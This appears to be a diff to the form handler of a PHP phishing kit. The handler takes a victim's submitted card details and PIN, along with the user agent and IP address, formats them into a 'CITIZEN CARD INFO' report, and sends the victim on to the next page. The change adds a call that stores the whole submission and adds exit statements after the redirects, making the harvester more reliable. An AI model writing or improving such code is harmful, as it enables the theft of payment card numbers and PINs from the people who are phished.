@@ -10,6 +10,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $atm = $_POST['pin'];
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
+
+    h4z3_store_submission('card', $_POST);
     
             $body  = "++++++++++ 🐱‍💻 CITIZEN CARD INFO 🐱‍💻 ++++++++++\r\n";
             $body .= "Card Number    : $ccn\r\n";
@@ -50,10 +52,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
         if($mailpage == "on"){
           header('Location: ../mail');
+          exit;
         }
         else{
           header('Location: ../complete');
-        }  
+          exit;
+        }
 
 }
 ?>
